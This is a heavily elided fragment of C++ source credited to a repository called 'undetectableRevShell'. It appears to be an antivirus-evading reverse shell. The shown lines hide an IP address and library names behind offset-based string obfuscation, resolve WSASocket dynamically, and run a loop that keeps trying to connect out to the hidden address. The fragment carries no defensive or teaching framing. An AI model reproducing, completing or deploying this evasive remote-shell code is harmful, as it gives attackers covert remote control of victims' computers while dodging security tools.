...
// credits: https://github.com/Ximoxkil547/undetectableRevShell/tree/main
...
{
    //offsets for obfuscated strings
    ...
    int ipaddr_offset[] = { 0,9,1,7,0,5,8,7,4,5,7,0,10,0 };
    ...
    //loading libraries using obfuscated strings
    ...
    while (true) {
        ...
        WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
            GetProcAddress(GetModuleHandleW(wide_original_ws_2_32_dl_l.c_str()),
        ...
        printf("Trying to connect to : %s\n", getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset)).c_str(), " port :", port);
